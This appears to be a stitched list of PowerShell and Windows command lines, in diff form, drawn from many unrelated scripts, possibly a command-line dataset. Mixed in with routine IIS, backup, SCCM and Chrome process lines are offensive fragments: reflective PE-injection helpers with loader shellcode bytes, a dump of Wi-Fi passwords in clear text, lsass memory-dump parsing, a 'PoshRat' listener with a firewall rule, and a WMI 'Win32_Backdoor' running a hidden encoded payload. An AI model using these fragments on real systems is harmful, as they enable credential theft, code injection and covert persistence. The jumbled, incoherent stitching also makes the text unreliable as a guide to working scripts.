+$Win32Functions = New-Object System.Object; $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject; $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32]); $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
+$Win32Functions = New-Object System.Object; $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory; $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool]); $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+$Win32Functions = New-Object System.Object; $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory; $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool]); $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
+$Win32Functions = New-Object System.Object; $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread; $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]); $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
+$Win32Functions = New-Object System.Object; $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread; $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool]); $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
+$Win32Functions = New-Object System.Object; $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken; $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool]); $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
+$version = New-Object 'Version' 6,0
+$Win32Functions = New-Object System.Object; $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx; $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32]); $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate); $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
+Throw "Cannot compare byte arrays of different size"
+Set-WebConfigurationProperty "system.applicationHost/applicationPools/applicationPoolDefaults" -Name queueLength -value 5000 -Verbose
+Throw "Cannot add bytearrays of different sizes"
+Throw "Trying to write to memory smaller than allocated address range."
+$Domain = [AppDomain]::CurrentDomain$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false); $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }; $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }; $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods'); $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }; $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods'); $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+Throw "Unable to impersonate self"
+Throw "Unable to OpenThreadToken."
+Throw "Unable to call LookupPrivilegeValue"
+Set-WebConfigurationProperty "system.applicationHost/applicationPools/applicationPoolDefaults/processModel" -Name pingResponseTime -value "00:00:10" -Verbose
+Write-Verbose "Error creating remote thread, thread handle is null"
+$NtHeadersInfo = New-Object System.Object; $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
+$NtHeadersInfo = New-Object System.Object; $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
+$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+$LoadLibrarySC2 = @(0x48, 0xba)
+$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
+$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+$GetProcAddressSC2 = @(0x48, 0xba)
+$GetProcAddressSC3 = @(0x48, 0xb8)
+Set-WebConfigurationProperty "system.applicationHost/applicationPools/applicationPoolDefaults/processModel" -Name pingInterval -value "00:00:10" -Verbose
+$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
+$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll", "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
+Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
+Write-Verbose "Getting basic PE information from the file"
+$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
+$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
+$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear} >> a.txt
+$launchDate = get-date -f "yyyyMMddHHmmss"; $logDirectoryPath = "." + "\" + $launchDate
+$file = "$logDirectoryPath\lsass.dmp"
+#Copy inetpub folder
+$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
+$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version; $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture; $mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
+$kd = ".\x64\kd.exe"
+$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
+$buffer = "test.txt"; $fullScriptPath = (Resolve-Path -Path $buffer).Path; $file = "$logDirectoryPath\lsass.dmp"; $symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"; $kd = ".\x64\kd.exe"; $tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols; $tabFA = ($tabSystem -split ' '); $fi = [array]::indexof($tabFA,"PROCESS") + 1; $processAddress = $tabFA[$fi]; $FLINK = $tabFA[$fi]; $BLINK = $tabFA[$fi]; $chain = "$symfix f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))"
+netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
+netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+$listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add('http://+:80/') 
+$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null); $StaticClass.Name = 'Win32_Backdoor'
+Write-Verbose "Copying $SourceInetpub to $DestInetpub"
+if (Test-Path $registryPath32) {$registryPath = $registryPath32} 
+$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null); $StaticClass.Name = 'Win32_Backdoor'; $StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor persist ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
+xcopy $env:SystemDrive\inetpub\logs $LogDir /E /I /Q
+takeown --% /A /F C:\inetpub\history\* /r /d y
+xcopy $env:SystemDrive\inetpub\history $LogDir\history /E /I /Q
+xcopy $SourceInetpub $DestInetpub /E /I /Q
+remove-item $DestInetpub\logs -force -recurse -Verbose
+remove-item $DestInetpub\history -force -recurse -Verbose
+Set-WebConfigurationProperty "system.applicationHost/configHistory" -Name path -value ([System.IO.Path]::Combine("$LogDir","history"))
+Write-Verbose "Setting logging properties"
+Set-WebConfigurationProperty "system.applicationHost/sites/siteDefaults/logFile" -name logExtFileFlags -value "Date,Time,ClientIP,UserName,Method,UriStem,UriQuery,HttpStatus,HttpSubStatus,Win32Status,BytesSent,BytesRecv,TimeTaken,Host,UserAgent,Referer" -Verbose
+main$folder = "c:\temp"
+if (Test-Path $registryPathWow6432) {$registryPath = $registryPathWow6432} 
+$log = "c:\temp\deploy_web_server.txt"
+$date = get-date
+$zipurl = "https://raw.githubusercontent.com/2mgdev/azure_labs/master/www.zip"
+$output = $folder+"\www.zip"
+$Destination = "C:\inetpub\wwwroot"
+$HttpPort=80
+$httpRule="web server access rule port 80"
+Stop-Service W3SVC
+Copy-Item -Path $webapp -Destination $webfold -Recurse -ErrorAction SilentlyContinue
+New-WebApplication -name "WebTets" -PhysicalPath $webfold -Site 'Default Web Site' -Force
+if ($registryPath) {$uninstallString = (Get-ItemProperty -Path $registryPath -Name 'UninstallString').UninstallString} 
+Start-Service W3SVC
+if (-not(Test-Path $webfold.trim())) {New-Item -Path $webfold -ItemType Directory}
+$HTMLbase | out-file r:\Backups\BuckyBackup_$((Get-Date -UFormat "%Y-%m-%d"))_Log.html 
+start r:\Backups\BuckyBackup_$((Get-Date -UFormat "%Y-%m-%d"))_Log.html<#
+Create a scheduled task to run this 
+$Time = New-ScheduledTaskTrigger -At 12:00 -Once
+$User = "Contoso\Administrator"
+$PS = PowerShell.exe
+Register-ScheduledTask -TaskName "SoftwareScan" -Trigger $Time -User $User -Action $PS
+Copy-Item -Path $D_Drive -Destination $E_Drive -Recurse -PassThru -ErrorAction SilentlyContinue | Select @{Name="Action";Exp={"EyeFi D: to E:"}},BaseName,Extension,Length,Directory | Tee-Object -Variable movedItems
+if ($uninstallString) {Uninstall-ChocolateyPackage $packageName $installerType $silentArgs $uninstallString}
+$movedItems = Copy-Item -Path $dropboxD -Destination $dropboxE -Recurse -PassThru -ErrorAction SilentlyContinue| Select @{Name="Action";Exp={"Copy to Backup Drive"}},BaseName,Extension,Length,Directory
+$TaskStruct = New-Object PSObject -Property @{WebApp = $null;UseSharepointWarningLimit = $true;WarningTreshold = [int]90;CriticalTreshold = [int]95;ExitCode = [int]3;OutputString = [string]"Critical: Error processing, no data returned"}
+Invoke-WebRequest https://ntd.taserver.com/site/hcsetup.exe -OutFile C:\users\admin\downloads\hcsetup.exe ; Invoke-WebRequest https://ntd.taserver.com/site/hcupdate.exe -OutFile C:\users\admin\downloads\hcupdate.exe$loc = Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall
+$names = $loc |foreach-object {Get-ItemProperty $_.PsPath}
+foreach ($name in $names){Write-Host $name.Displayname}
+$comp=[adsi]"WinNT://$($env:ComputerName)"
+$users = $comp.Children | ?{ $_.SchemaClassName -eq 'User' }
+$users | select @{L="Name";E={$_.psbase.Properties.Name.Value}}| out-file "C:\Users\mcurtin\Desktop\OTHER\list-users.txt"[System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.dll")) | Out-Null
+[System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.Extender.dll")) | Out-Null
+[System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.MsiInstaller.dll")) | Out-Null
+$packageName = '{{PackageName}}';$installerType = 'exe';$url = '{{DownloadUrl}}';$silentArgs = '/S'
+$SiteServer = "Server01"
+$SiteCode = "law"
+$CurrentContentPath = "Server02"
+$UpdatedContentPath = "Server01"
+$Applications = Get-WmiObject -ComputerName $SiteServer -Namespace root\SMS\site_$SiteCode -class SMS_Application | Where-Object {$_.IsLatest -eq $True}
+$ApplicationCount = $Applications.Count
+Remove-Item "C:\users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\initializestartup.bat" -confirm:$false
+Remove-Item "C:\mcscript" -confirm:$false
+Remove-Item "C:\TempWU" -confirm:$false
+ping 8.8.8.8
+$validExitCodes = @(0)
+C:\Windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}
+"C:\Program Files (x86)\Google\Chrome\Application\81.0.4044.138\Installer\chrmstp.exe" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Windows\TEMP\Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=81.0.4044.138 --initial-client-data=0x218,0x21c,0x220,0x1f4,0x5c,0x7ff65b1f76a0,0x7ff65b1f76b0,0x7ff65b1f76c0
+C:\Windows\system32\DllHost.exe /Processid:{4D111E08-CBF7-4F12-A926-2C7920AF52FC}
+C:\Windows\system32\cmd.exe /c ""C:\Windows\TEMP\e4eab449-4502-40fa-9f06-47251b04bf19.bat""
+C:\Windows\system32\cmd.exe /c ""C:\Windows\TEMP\7599209b-6e95-42f2-9582-a868083bbe3d.bat""
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1911.3-0\MpCmdRun.exe" GetDeviceTicket -AccessKey 22DC2FA1-45F2-588F-1C94-024EF487BD74
+"C:\Program Files (x86)\Google\Chrome\Application\81.0.4044.129\Installer\setup.exe" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Windows\TEMP\Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=81.0.4044.129 --initial-client-data=0x210,0x214,0x218,0x1ec,0x21c,0x7ff7471176a0,0x7ff7471176b0,0x7ff7471176c0
+C:\Windows\TEMP\CR_45A30.tmp\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Windows\TEMP\Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=81.0.4044.138 --initial-client-data=0x218,0x21c,0x220,0x1f4,0x224,0x7ff746d276a0,0x7ff746d276b0,0x7ff746d276c0
+"cscript.exe" "C:\Windows\TEMP\c2550dfc-ff27-4c88-8222-065997764b9d.vbs" //nologo
+"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --type=utility --field-trial-handle=1456,15849293576009922172,5710802307989335612,131072 --lang=fr --service-sandbox-type=utility --enable-audio-service-sandbox --mojo-platform-channel-handle=4460 --ignored=" --type=renderer " /prefetch:8
+"C:\Program Files (x86)\Google\Update\Install\{99737BAB-6CB4-4CB7-9382-4714E4F57D30}\81.0.4044.129_81.0.4044.122_chrome_updater.exe" --verbose-logging --do-not-launch-chrome --system-level
+C:\Windows\TEMP\CR_C7751.tmp\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Windows\TEMP\Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=81.0.4044.129 --initial-client-data=0x210,0x214,0x218,0x1ec,0x21c,0x7ff6100376a0,0x7ff6100376b0,0x7ff6100376c
